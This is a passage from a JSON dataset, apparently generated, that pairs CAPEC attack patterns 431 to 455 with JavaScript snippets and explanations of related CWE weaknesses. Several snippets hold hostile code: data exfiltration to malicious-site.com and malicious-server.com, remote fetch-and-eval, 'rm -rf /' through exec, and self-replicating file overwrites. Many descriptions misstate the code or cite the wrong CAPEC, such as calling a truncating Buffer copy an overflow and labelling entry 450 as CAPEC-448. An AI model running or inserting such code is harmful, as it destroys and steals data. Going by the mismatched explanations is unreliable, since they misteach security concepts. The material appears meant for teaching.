        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction processData(input) {\n  // Simulate speculative execution vulnerability\n  let result;\n  if (input === 'expected') {\n    result = sensitiveData;\n  } else {\n    result = 'default';\n  }\n  return result;\n}\n\n// Simulate excessive attack surface by exposing function to global scope\nwindow.processData = processData;\n\n// Example usage\nconsole.log(processData('unexpected')); // Potentially exposes sensitive data",
        "description": "This JavaScript code snippet demonstrates a speculative execution vulnerability, where sensitive data ('user_password') might be exposed due to incorrect transient execution. The `processData` function simulates a scenario where speculative execution could lead to the exposure of sensitive information. Additionally, the function is exposed to the global scope, representing an excessive attack surface. This snippet embodies the main idea of the deprecated CAPEC by illustrating how microarchitectural state and transient execution can lead to information exposure, and it also incorporates the related CWEs by showing excessive attack surface and potential information exposure."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q;\n    try {\n        // CWE-1286: No validation of input syntax\n        if (!query.match(/^[a-zA-Z0-9 ]*$/)) {\n            throw new Error('Invalid input');\n        }\n        // CWE-1336: Improper neutralization in template engine\n        const result = `<div>Search results for: ${query}</div>`;\n        res.send(result);\n    } catch (error) {\n        // CWE-81: Improper neutralization of script in error message\n        // CWE-209: Error message contains sensitive information\n        res.status(500).send(`Error: ${error.message} - Query: ${query}`);\n    }\n});\n\n// CWE-1125: Excessive attack surface\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet represents a vulnerable Express.js application that handles search queries. The code demonstrates several security weaknesses:\n\n1. **CWE-1286**: The input query is not properly validated for syntactic correctness, allowing potentially harmful input.\n2. **CWE-1336**: The input is directly inserted into a template without proper neutralization, making it susceptible to template injection attacks.\n3. **CWE-81**: If an error occurs, the error message is not properly neutralized, allowing script injection in the error message.\n4. **CWE-209**: The error message includes sensitive information, such as the original query, which could be exploited by attackers.\n5. **CWE-1125**: The application exposes an excessive attack surface by running a server that listens on port 3000, potentially exposing more functionality than necessary.\n\nThe code snippet embodies the deprecated CAPEC idea of influencing a target via improper handling of input and error messages, leading to various security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/process', (req, res) => {\n  const userInput = req.body.input;\n  // CWE-1286: Improper Validation of Syntactic Correctness of Input\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // CWE-149: Improper Neutralization of Quoting Syntax\n  const sanitizedInput = userInput.replace(/['\"`]/g, '');\n  // CWE-804: Guessable CAPTCHA\n  const captcha = req.body.captcha;\n  if (captcha !== '1234') { // Weak CAPTCHA\n    return res.status(400).send('Invalid CAPTCHA');\n  }\n  res.send(`Processed input: ${sanitizedInput}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that processes user input. It demonstrates several security weaknesses related to the deprecated CAPEC 'Target Influence via Voice in NLP' and the associated CWEs. The code includes:\n\n1. **CWE-1286: Improper Validation of Syntactic Correctness of Input** - The input is expected to be alphanumeric, but the validation is done using a simple regex, which may not cover all edge cases.\n2. **CWE-149: Improper Neutralization of Quoting Syntax** - The input is sanitized by removing quotes, but this approach may not be comprehensive enough to prevent all injection attacks.\n3. **CWE-804: Guessable CAPTCHA** - The CAPTCHA validation uses a hardcoded value ('1234'), making it easily guessable and ineffective against automated attacks.\n\nThe code aims to highlight the importance of proper input validation, sanitization, and the use of strong CAPTCHA mechanisms to prevent security vulnerabilities."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('SensitiveData');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-120: Buffer Copy without Checking Size of Input\n    let buffer = Buffer.alloc(10);\n    data.copy(buffer);\n    console.log('Processed: ' + buffer.toString());\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information in cleartext (CWE-319). Upon receiving data from the server, it copies the data into a buffer without checking the size of the input (CWE-120), potentially leading to a buffer overflow. This embodies the main idea of the CAPEC 'Target Influence via The Human Buffer Overflow' by showing how improper handling of communication and buffer operations can lead to vulnerabilities. The code represents how subtle manipulations in communication patterns can exploit weaknesses in message integrity and buffer management."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const sensitiveData = { user: 'JohnDoe', ssn: '123-45-6789', balance: 1000 };\n\nfunction getUserData(query) {\n  if (query === 'balance') {\n    return sensitiveData.balance;\n  } else if (query === 'user') {\n    return sensitiveData.user;\n  } else if (query === 'ssn') {\n    return sensitiveData.ssn;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// Simulating an attacker querying the system\nconsole.log(getUserData('balance')); // 1000\nconsole.log(getUserData('user')); // JohnDoe\nconsole.log(getUserData('ssn')); // 123-45-6789\n\n// Observable behavioral discrepancy\nfunction login(username, password) {\n  if (username === 'admin' && password === 'password123') {\n    return 'Login successful';\n  } else if (username === 'admin') {\n    return 'Incorrect password';\n  } else {\n    return 'User not found';\n  }\n}\n\n// Simulating an attacker observing login behavior\nconsole.log(login('admin', 'wrongpassword')); // Incorrect password\nconsole.log(login('admin', 'password123')); // Login successful\nconsole.log(login('user', 'password123')); // User not found\n\n// Guessable CAPTCHA\nfunction validateCaptcha(input) {\n  const captcha = '1234';\n  return input === captcha ? 'CAPTCHA passed' : 'CAPTCHA failed';\n}\n\n// Simulating an attacker guessing CAPTCHA\nconsole.log(validateCaptcha('1234')); // CAPTCHA passed\nconsole.log(validateCaptcha('0000')); // CAPTCHA failed",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Interview and Interrogation' and the associated CWEs. The `getUserData` function exposes sensitive information through data queries (CWE-202). The `login` function reveals observable behavioral discrepancies (CWE-205) by providing different responses based on the correctness of the username and password. The `validateCaptcha` function uses a guessable CAPTCHA (CWE-804), which can be easily bypassed by an attacker. These examples illustrate how an attacker can infer sensitive information and exploit system behaviors to gain unauthorized access."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const options = {\n    hostname: 'trusted-endpoint.com',\n    port: 80,\n    path: '/api/data',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    let data = '';\n    proxyRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    proxyRes.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(data);\n    });\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  req.pipe(proxyReq);\n  req.on('end', () => {\n    proxyReq.end();\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that proxies incoming requests to a trusted endpoint. It demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Instant Rapport' and the associated CWEs:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The server checks for a custom header to verify the source of the request, but this is a weak verification method that can be easily spoofed.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The code specifies a fixed destination for outgoing requests, which could be incorrect or manipulated.\n\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server does not adequately verify the identity of actors at both ends of the communication channel, allowing potential unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could influence the target system by exploiting weak verification and communication practices, thereby establishing a rapport that could be used for malicious purposes."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "const fs = require('fs');\n\n// Simulate reliance on an insufficiently trustworthy component\nconst untrustedComponent = require('./untrustedComponent');\n\n// Simulate unprotected confidential information\nconst confidentialData = 'Sensitive Information';\n\n// Simulate insufficient technical documentation\n// No comments or documentation provided for the following function\nfunction processData(data) {\n  return untrustedComponent.process(data);\n}\n\n// Simulate product released in non-release configuration\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Warning: Running in non-production configuration');\n}\n\n// Simulate reliance on a non-updateable component\ntry {\n  fs.writeFileSync('/path/to/non-updateable-component', 'new data');\n} catch (err) {\n  console.error('Component is not updateable');\n}\n\n// Process confidential data using the untrusted component\nconst result = processData(confidentialData);\nconsole.log('Processed Data:', result);",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Modification During Manufacture' and its associated CWEs. The code relies on an untrusted component ('untrustedComponent'), which represents CWE-1357. It processes confidential data ('confidentialData') without adequate protection, illustrating CWE-1297. The function 'processData' lacks sufficient technical documentation, aligning with CWE-1059. The code checks if it is running in a non-production configuration, representing CWE-1269. Finally, it attempts to update a non-updateable component, demonstrating CWE-1329. This snippet embodies the risks of using untrusted components and configurations in the manufacturing process, potentially leading to security vulnerabilities."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableComponent = require('vulnerable-component');\n\n// CWE-1269: Product Released in Non-Release Configuration\nconst config = require('./config/development.json');\n\nhttp.createServer((req, res) => {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  if (req.url === '/config') {\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(config));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nvulnerableComponent.doSomething();\n\n// CWE-207: Observable Behavioral Discrepancy With Equivalent Products\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Running in development mode');\n}",
        "description": "This JavaScript code snippet demonstrates a server that is vulnerable to several issues related to the CAPEC 'Manipulation During Distribution'. The code uses a vulnerable third-party component (CWE-1395) and is configured with a non-release configuration (CWE-1269). It exposes sensitive configuration information to unauthorized actors (CWE-200) and relies on an insufficiently trustworthy component (CWE-1357). Additionally, it reveals its development mode through observable behavior (CWE-207). This snippet highlights the risks associated with manipulation during the distribution of software, where various stages and components can be tampered with, leading to security vulnerabilities."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class HardwareComponent {\n  constructor(version) {\n    this.version = version;\n    this.isUpdateable = false; // CWE-1329: Component is not updateable\n  }\n\n  injectError() {\n    if (!this.isUpdateable) {\n      console.log('Error injected into hardware component.'); // CWE-1334: Unauthorized error injection\n    }\n  }\n\n  downgradeVersion(newVersion) {\n    if (newVersion < this.version) {\n      this.version = newVersion; // CWE-1328: Security version number mutable to older versions\n      console.log('Version downgraded to:', this.version);\n    }\n  }\n}\n\n// Simulate an attack\nlet component = new HardwareComponent(2.0);\ncomponent.injectError();\ncomponent.downgradeVersion(1.0);",
        "description": "This JavaScript code snippet represents a simplified model of a hardware integrity attack. The `HardwareComponent` class simulates a hardware component with a version number and a flag indicating whether it is updateable. The `injectError` method simulates an unauthorized error injection (CWE-1334) if the component is not updateable (CWE-1329). The `downgradeVersion` method allows the version number to be downgraded to an older, potentially vulnerable version (CWE-1328). This code embodies the main idea of the CAPEC by demonstrating how an adversary might exploit weaknesses in the system maintenance process to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function benignFunction() {\n  // This function appears to be benign\n  console.log('Hello, World!');\n}\n\nfunction maliciousLogic() {\n  // Malicious logic hidden from the user\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Improper access control allows unauthorized execution of malicious logic\nif (userIsAdmin) {\n  maliciousLogic();\n}\n\nbenignFunction();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Insertion' (CAPEC) by embedding malicious logic within a seemingly benign function. The 'benignFunction' appears harmless, logging 'Hello, World!' to the console. However, the 'maliciousLogic' function contains code that sends sensitive information to a malicious site. The improper access control (CWE-284) is simulated by a conditional check 'if (userIsAdmin)', which allows unauthorized execution of the malicious logic. This snippet represents how an adversary might hide malicious code within a benign component, exploiting weaknesses such as improper access control and embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousFunction() {\n  // Malicious code hidden within benign code\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Trojan Horse: calling the malicious function within a benign function\nfunction trojanHorse() {\n  benignFunction();\n  maliciousFunction();\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'benignFunction' represents legitimate functionality, while 'maliciousFunction' contains hidden malicious logic that sends sensitive information to a remote server. The 'trojanHorse' function calls both the benign and malicious functions, embodying the idea of a Trojan Horse (CWE-507). This code snippet also touches on the concept of embedded malicious code (CWE-506) and non-replicating malicious code (CWE-508), as the malicious logic is hidden within the benign code and does not attempt to spread to other systems."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Malicious logic inserted by an authorized developer\nfunction maliciousFunction() {\n  // CWE-506: Embedded Malicious Code\n  console.log('Executing malicious code');\n  // CWE-1229: Creation of Emergent Resource\n  let emergentResource = new Function('return this')();\n  emergentResource.maliciousProperty = 'maliciousValue';\n}\n\n// Insecure permissions example\nlet insecureObject = {};\nObject.defineProperty(insecureObject, 'insecureProperty', {\n  value: 'insecure',\n  writable: true, // CWE-277: Insecure Inherited Permissions\n  enumerable: true,\n  configurable: true\n});\n\n// Lack of administrator control over security\nlet securitySettings = {\n  adminControl: false // CWE-671: Lack of Administrator Control over Security\n};\n\n// Simulate the injection of malicious logic\nmaliciousFunction();\n\n// Example usage\nlet url = 'http://example.com/maliciousCode.js';\ndownloadAndExecute(url);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Inserted Into Product by Authorized Developer' (CAPEC). The 'downloadAndExecute' function fetches and executes code from a remote URL without verifying its integrity (CWE-494). The 'maliciousFunction' contains embedded malicious code (CWE-506) that creates an emergent resource (CWE-1229) by adding a property to the global object. An object with insecure inherited permissions is defined (CWE-277), and a security settings object lacks administrator control (CWE-671). This code represents how an authorized developer could inject malicious logic into a product, leveraging various weaknesses to compromise security."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "function authenticate(user, password) {\n  // Security-critical check\n  if (user === 'admin' && password === 'securePassword') {\n    console.log('Authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Malicious code inserted during development\nfunction authenticate(user, password) {\n  if (user === 'admin') {\n    console.log('Authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\nauthenticate('admin', 'wrongPassword');",
        "description": "This JavaScript code snippet demonstrates a development alteration attack where an adversary modifies the authentication function during development. The original function includes a security-critical check that verifies both the username and password. However, the malicious alteration removes the password check, allowing any user with the username 'admin' to be authenticated regardless of the password. This embodies the CAPEC concept of modifying a system during development to introduce vulnerabilities that can be exploited later. The related CWEs are represented by the removal of security-critical code (CWE-733, CWE-1037) and the insertion of malicious code (CWE-506)."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://untrusted-source.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    fs.writeFileSync('malicious.js', data);\n    require('./malicious.js'); // CWE-506: Embedded Malicious Code\n  });\n});\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nlet dynamicCode = 'console.log(\"Executing dynamic code\");';\neval(dynamicCode);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can manipulate a configuration management system to insert malicious logic into a software product. The code downloads a JavaScript file from an untrusted source (CWE-494) and includes it in the application (CWE-829). The downloaded file is then executed, potentially containing embedded malicious code (CWE-506). Additionally, the code uses `eval` to execute dynamically managed code (CWE-913), which can be exploited if the dynamic code is not properly controlled. This snippet embodies the main idea of CAPEC by showing how an adversary can manipulate the build or update process to introduce malicious logic into a software product."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "const http = require('http');\nconst untrustedLib = require('untrusted-lib'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n\nhttp.createServer((req, res) => {\n  if (req.url === '/data') {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    untrustedLib.getData((err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Server Error');\n      } else {\n        res.writeHead(200, {'Content-Type': 'application/json'});\n        res.end(JSON.stringify(data));\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that includes and uses a third-party library named 'untrusted-lib'. The server listens for requests and uses the untrusted library to fetch data when the '/data' endpoint is accessed. This example embodies the CAPEC concept of 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component' by illustrating the inclusion of a potentially insecure third-party component (CWE-829) and the dependency on a vulnerable third-party component (CWE-1395). The code highlights the risk of relying on untrusted or insufficiently trustworthy components, which could lead to security vulnerabilities in the product."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (username === 'admin' && password === 'password123') {\n    // Violation of Secure Design Principles (CWE-657)\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\n// Design alteration: Exposing sensitive system information (CWE-497)\nfunction getSystemInfo() {\n  // Sensitive information exposed\n  return {\n    os: 'Windows 10',\n    version: '10.0.19042',\n    architecture: 'x64'\n  };\n}\n\n// Example usage\nif (authenticateUser('admin', 'password123')) {\n  console.log(getSystemInfo());\n}",
        "description": "This JavaScript code snippet demonstrates a design alteration attack by incorporating several related CWEs. The `authenticateUser` function enforces server-side security on the client side (CWE-602) and violates secure design principles by using hardcoded credentials (CWE-657). The `getSystemInfo` function exposes sensitive system information (CWE-497) to unauthorized users. This code represents a scenario where an adversary has altered the design to include insecure authentication and information exposure, which can be exploited once the system is deployed."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst dllPath = path.join(__dirname, 'untrusted', 'malicious.dll');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `\nfunction stealData() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data', 'utf8');\n  // CWE-497: Exposure of Sensitive System Information\n  console.log('Sensitive Data:', sensitiveData);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicate() {\n  const targetPath = '/path/to/target/system';\n  fs.copyFileSync(dllPath, path.join(targetPath, 'malicious.dll'));\n}\n\n// Inject malicious code into DLL\nfs.appendFileSync(dllPath, maliciousCode);\n\n// Execute malicious functions\nstealData();\nreplicate();\n`;\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nif (process.arch === 'x64') {\n  fs.appendFileSync(dllPath, '\\x90\\x90\\x90'); // NOP padding for x64 architecture\n} else {\n  fs.appendFileSync(dllPath, '\\x90'); // NOP padding for other architectures\n}",
        "description": "This JavaScript code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first constructs a path to an untrusted DLL (CWE-426). It then defines a malicious code snippet that reads sensitive data from the file system and logs it (CWE-506 and CWE-497). The malicious code also includes a function to replicate itself by copying the DLL to a target system (CWE-509). The code appends this malicious code to the DLL file. Additionally, it includes a check for the machine architecture to append appropriate padding (CWE-1102). This snippet embodies the idea of tampering with a DLL to embed a virus that can steal data and replicate itself."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction handleUserInput(input) {\n  const sanitizedInput = input.replace(/(AUX|CON|NUL|PRN|COM[1-9]|LPT[1-9])/gi, '');\n  const filePath = path.join(__dirname, sanitizedInput);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\nfunction executeMaliciousCode() {\n  // Malicious code hidden within benign functionality\n  console.log('Executing hidden malicious code...');\n  // Example: Deleting important system files\n  fs.unlink('/important/system/file', (err) => {\n    if (err) console.error('Failed to delete system file:', err);\n  });\n}\n\n// Simulate user input\nhandleUserInput('userInput.txt');\n\n// Simulate malicious code execution\nexecuteMaliciousCode();",
        "description": "This JavaScript code snippet demonstrates a scenario where user input is improperly handled, potentially leading to security vulnerabilities. The `handleUserInput` function attempts to sanitize user input to avoid Windows device names (CWE-67), but the sanitization is simplistic and may not cover all edge cases. The `executeMaliciousCode` function represents hidden malicious functionality (CWE-507 and CWE-506) that could be embedded within seemingly benign code. This function performs a harmful action, such as deleting an important system file, illustrating the concept of a Trojan Horse. The code snippet embodies the main idea of CAPEC-448, which involves malware infection through seemingly benign software, and highlights the associated weaknesses."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst searchPath = process.argv[2] || './';\n\n// CWE-67: Improper Handling of Windows Device Names\nconst maliciousFileName = 'AUX.js';\nconst maliciousFilePath = path.join(searchPath, maliciousFileName);\n\n// CWE-507: Trojan Horse\nconst trojanHorseCode = `\nconsole.log('This is a benign message.');\n// Malicious code hidden from normal operation\nrequire('child_process').exec('rm -rf /');\n`;\n\n// CWE-506: Embedded Malicious Code\nfs.writeFileSync(maliciousFilePath, trojanHorseCode);\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nfs.readdir(searchPath, (err, files) => {\n  if (err) throw err;\n  files.forEach(file => {\n    if (file !== maliciousFileName) {\n      const targetPath = path.join(searchPath, file);\n      fs.copyFileSync(maliciousFilePath, targetPath);\n    }\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a malicious script that embodies the main idea of CAPEC-448: Embed Virus into DLL, with context from related CWEs. The script creates a Trojan Horse file named 'AUX.js' (CWE-67) in a specified or default directory (CWE-426). The file contains seemingly benign code but also includes hidden malicious code that deletes the root directory (CWE-507, CWE-506). The script then replicates this malicious file to other files in the same directory, mimicking virus or worm behavior (CWE-509)."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\n// Simulate a Trojan Horse by hiding malicious code in a seemingly benign function\nfunction benignFunction() {\n  console.log('This is a benign function.');\n  // Hidden malicious code\n  if (os.platform() === 'win32') {\n    fs.writeFileSync('C:\\malicious_payload.exe', 'malicious content');\n  } else if (os.platform() === 'linux') {\n    fs.writeFileSync('/tmp/malicious_payload', 'malicious content');\n  }\n}\n\nbenignFunction();\n\n// Simulate a call to a non-ubiquitous API\ntry {\n  const nonUbiquitousAPI = require('non-ubiquitous-api');\n  nonUbiquitousAPI.doSomething();\n} catch (error) {\n  console.error('API not available on this platform:', error.message);\n}\n\n// Simulate firmware that is not updateable\nconst firmwareVersion = '1.0.0';\nfunction checkForFirmwareUpdate() {\n  console.log('Firmware update not supported. Current version:', firmwareVersion);\n}\n\ncheckForFirmwareUpdate();",
        "description": "This JavaScript code snippet demonstrates a simulated attack pattern where a Trojan Horse is hidden within a seemingly benign function. The function `benignFunction` appears to perform a harmless task but contains hidden code that writes a malicious payload to the filesystem based on the operating system. Additionally, the code includes a call to a non-ubiquitous API, which may not be available on all platforms, leading to potential denial of service or inconsistencies. Finally, the code simulates a scenario where the firmware is not updateable, representing a security weakness where users cannot patch vulnerabilities. This snippet embodies the main idea of the deprecated CAPEC pattern and related CWEs by showcasing how malicious code can propagate through seemingly benign actions and highlighting potential security weaknesses."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "const fs = require('fs');\n\n// Malicious code hidden in a hardware interaction function\nfunction readHardwareRegister(registerAddress) {\n  // Simulate reading from a hardware register\n  let registerValue = fs.readFileSync(`/dev/hardware/${registerAddress}`, 'utf8');\n  \n  // Malicious logic: Replicate malicious code\n  if (registerAddress === '0xDEADBEEF') {\n    fs.writeFileSync('/tmp/malicious_payload', 'Malicious code executed');\n  }\n  \n  return registerValue;\n}\n\n// Example usage\nlet value = readHardwareRegister('0xDEADBEEF');\nconsole.log(`Register value: ${value}`);",
        "description": "This JavaScript code snippet simulates a scenario where malicious logic is inserted into a function that interacts with hardware registers. The `readHardwareRegister` function reads from a simulated hardware register. If a specific register address ('0xDEADBEEF') is accessed, it triggers malicious behavior by writing a payload to the filesystem. This represents the CAPEC 'Infected Hardware' by demonstrating how an adversary can insert and hide malicious logic within hardware interactions. The code also touches on related CWEs, such as 'Embedded Malicious Code' (CWE-506) and 'Improper Access Control for Register Interface' (CWE-1262), by showing how malicious code can be embedded and how improper access control can be exploited."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-294: Capture-replay vulnerability\n  if (user === 'admin' && pass === 'password123') {\n    console.log('Authentication successful');\n    // CWE-506: Embedded malicious code\n    executeMaliciousCode();\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\nfunction executeMaliciousCode() {\n  // Malicious logic that could degrade hardware redundancy (CWE-1334)\n  console.log('Injecting errors into hardware redundancy system');\n  // Simulate error injection\n  for (let i = 0; i < 10; i++) {\n    console.error('Error injected into system');\n  }\n}\n\n// Simulate a capture-replay attack\nconst capturedUser = 'admin';\nconst capturedPass = 'password123';\nauthenticate(capturedUser, capturedPass);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a malicious logic insertion attack via counterfeit hardware, as described in the deprecated CAPEC. The `authenticate` function contains a capture-replay vulnerability (CWE-294), where an attacker can bypass authentication by replaying captured credentials. Upon successful authentication, the function calls `executeMaliciousCode`, which simulates the injection of errors into a hardware redundancy system (CWE-1334), representing embedded malicious code (CWE-506). This code snippet highlights the potential risks of malicious logic insertion and the impact it can have on system integrity."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "/* Malicious Logic Insertion into Product Hardware Example */\n\n// Simulating a hardware component with embedded malicious code\nclass HardwareComponent {\n  constructor() {\n    this.data = 'sensitive data';\n    this.undocumentedFeature = this.maliciousFunction;\n  }\n\n  // Malicious function that exfiltrates sensitive data\n  maliciousFunction() {\n    console.log('Exfiltrating data:', this.data);\n    // Simulate sending data to an unauthorized actor\n    fetch('http://malicious-server.com/exfiltrate', {\n      method: 'POST',\n      body: JSON.stringify({ data: this.data }),\n      headers: { 'Content-Type': 'application/json' }\n    });\n  }\n\n  // Function that relies on a non-updateable component\n  nonUpdateableComponent() {\n    console.log('This component cannot be updated or patched.');\n  }\n}\n\n// Instantiate the hardware component\nconst compromisedComponent = new HardwareComponent();\n\n// Trigger the malicious function via the undocumented feature\ncompromisedComponent.undocumentedFeature();",
        "description": "This JavaScript code snippet simulates a hardware component that has been compromised with embedded malicious code. The `HardwareComponent` class contains sensitive data and an undocumented feature (`undocumentedFeature`) that points to a malicious function (`maliciousFunction`). This function exfiltrates the sensitive data to a malicious server. Additionally, the class includes a method (`nonUpdateableComponent`) that represents reliance on a non-updateable component, highlighting the inability to patch or update the component to remove vulnerabilities. This code embodies the main idea of CAPEC-452 by demonstrating how malicious logic can be inserted into product hardware, leveraging related CWEs such as embedded malicious code, reliance on non-updateable components, and inclusion of undocumented features."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
